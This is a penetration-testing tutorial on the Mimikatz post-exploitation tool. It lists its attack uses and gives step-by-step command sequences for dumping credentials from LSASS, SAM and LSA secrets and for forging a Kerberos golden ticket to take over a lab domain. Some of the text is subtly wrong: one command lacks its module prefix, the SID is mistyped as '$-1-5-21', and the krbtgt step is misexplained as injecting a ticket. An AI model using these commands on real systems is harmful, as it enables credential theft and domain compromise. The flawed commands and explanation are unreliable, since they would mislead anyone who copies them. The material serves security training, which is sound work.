[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a powerful and well-known post-exploitation tool primarily used for extracting plaintext passwords and manipulating authentication credentials in Windows environments. It was created by Benjamin Delpy, and it gained popularity as a security tool for demonstrating various security weaknesses and for conducting penetration testing. However, it has also been abused by malicious actors for cyberattacks.

#### Usage
1. **Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) Attacks:** Mimikatz can extract and use NTLM hashes or Kerberos tickets to gain unauthorized access to other systems without needing the actual user password.
2. **Extracting Plaintext Passwords:** Mimikatz can extract plaintext passwords from LSASS (Local Security Authority Subsystem Service) memory, which stores credentials in Windows.
3. **Golden Ticket and Silver Ticket Attacks:** Mimikatz can forge Kerberos tickets, allowing attackers to impersonate any user within the domain.
4. **Kerberoasting:** Mimikatz can perform Kerberoasting attacks to extract service account credentials from Kerberos tickets.
5. **DPAPI (Data Protection API) Operations:** Mimikatz can decrypt data protected using DPAPI, such as browser passwords and other sensitive information.
6. **Pass-the-Cache (PtC) Attack:** Mimikatz can extract cached logon credentials from Windows systems.

#### Credentials Dumping
```bash
C:\User\Downloads> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::lsa /patch
```
**Explanation**
1. `privilege::debug`: This command allows Mimikatz to enable debug privileges, which are required for certain operations like extracting plaintext passwords from memory.
2. `sekurlsa::logonpasswords`: This command instructs Mimikatz to extract plaintext passwords from the Local Security Authority Subsystem Service (LSASS) memory. LSASS is a critical system process that stores authentication credentials in Windows. By executing this command, Mimikatz tries to obtain credentials of logged-in users.
3. `lsadump::sam`: This command tells Mimikatz to dump the Security Account Manager (SAM) database, which contains user account information, including password hashes.
4. `lsadump::lsa /patch`: This command attempts to extract LSA Secrets, which are sensitive data stored in the Local Security Authority (LSA) subsystem, such as auto-logon passwords. The "/patch" option may be used to enable certain functionality if it is required.

#### Golden Ticket Attacks
```bash
C:\User\Downloads> mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsa /inject /name:krbtgt
mimikatz # kerberos::golden /User:FakeUser /domain:marvel.local /sid:$-1-5-21-3263... /krbtgt:<NTLM Hash> /id:500 /ptt
mimikatz # misc::cmd
```
1. `lsa /inject /name:krbtgt`: This command instructs Mimikatz to inject the specified "krbtgt" ticket into the Local Security Authority (LSA) process. The "krbtgt" account is a privileged account in Active Directory, responsible for processing ticket-granting tickets (TGTs) during Kerberos authentication.
2. `kerberos::golden /User:FakeUser /domain:marvel.local /sid:$-1-5-21-3263... /krbtgt:<NTLM Hash> /id:500 /ptt`: This command is used to create a "Golden Ticket," which is an unauthorized access ticket that grants full administrative access to a domain controller and other systems within the domain. The command specifies various parameters for creating the ticket, including the target user ("FakeUser"), the domain name ("marvel.local"), the domain Security Identifier (SID), the NTLM hash of the "krbtgt" account, the user ID (500), and the "/ptt" flag to inject the ticket into memory.
3. `misc::cmd`: This command is used to execute arbitrary commands on the compromised system. It allows an attacker to run commands on the target system with elevated privileges obtained through the "Golden Ticket."
